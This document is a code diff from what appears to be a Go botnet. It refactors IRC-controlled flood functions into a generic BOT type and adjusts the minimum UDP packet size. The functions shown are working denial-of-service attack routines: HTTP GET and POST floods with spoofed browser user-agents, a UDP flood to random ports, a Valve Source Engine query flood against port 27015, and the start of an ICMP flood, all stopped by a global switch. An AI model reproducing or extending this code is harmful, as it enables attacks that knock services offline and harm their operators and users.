@@ -15,7 +15,7 @@ import (
 
 var AttackSwitch bool
 
-func (irc *IRC) GET(getTarget string) {
+func (bot *BOT) GET(getTarget string) {
 	agentSlice := []string{
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
@@ -25,7 +25,7 @@ func (irc *IRC) GET(getTarget string) {
 	}
 	getRequest, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
 	if err != nil {
-		irc.IRCreport(err.Error())
+		bot.Report(err.Error())
 	}
 	get := &http.Client{}
 
@@ -40,7 +40,7 @@ func (irc *IRC) GET(getTarget string) {
 	}
 }
 
-func (irc *IRC) POST(postTarget string) {
+func (bot *BOT) POST(postTarget string) {
 	buffer := make([]byte, 50)
 	reqBody, _ := json.Marshal(map[string]string{
 		"email":    string(buffer),
@@ -49,7 +49,7 @@ func (irc *IRC) POST(postTarget string) {
 	})
 	postRequest, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
 	if err != nil {
-		irc.IRCreport(err.Error())
+		bot.Report(err.Error())
 	}
 	post := &http.Client{}
 
@@ -61,43 +61,43 @@ func (irc *IRC) POST(postTarget string) {
 	}
 }
 
-func (irc *IRC) udpPacketCraft(udpTarget, port string, buffer []byte) {
+func (bot *BOT) udpPacketCraft(udpTarget, port string, buffer []byte) {
 	udp, err := net.Dial("udp", udpTarget+":"+port)
 	if err != nil {
-		irc.IRCreport(err.Error())
+		bot.Report(err.Error())
 	}
 	udp.Write(buffer)
 	udp.Close()
 }
 
-func (irc *IRC) DUDP(udpTarget, packetSize string) {
+func (bot *BOT) DUDP(udpTarget, packetSize string) {
 	for {
 		size, _ := strconv.Atoi(packetSize)
-		if size <= 0 || size > 700 {
+		if size < 100 || size > 700 {
 			size = 700
 		}
 		dudpBuff := make([]byte, size)
-		irc.udpPacketCraft(udpTarget, fmt.Sprint(rand.Intn(65535)), dudpBuff)
+		bot.udpPacketCraft(udpTarget, fmt.Sprint(rand.Intn(65535)), dudpBuff)
 		if AttackSwitch {
 			break
 		}
 	}
 }
 
-func (irc *IRC) VSE(vseTarget string) {
+func (bot *BOT) VSE(vseTarget string) {
 	for {
 		vseBuff := []byte("TSource Engine Query")
-		irc.udpPacketCraft(vseTarget, "27015", vseBuff)
+		bot.udpPacketCraft(vseTarget, "27015", vseBuff)
 		if AttackSwitch {
 			break
 		}
 	}
 }
 
-func (irc *IRC) ICMP(icmpTarget string) {
+func (bot *BOT) ICMP(icmpTarget string) {
 	conn, err := icmp.ListenPacket("udp4", "0.0.0.0")
 	if err != nil {
-		irc.IRCreport(err.Error())
+		bot.Report(err.Error())
 	}
 	defer conn.Close()
 
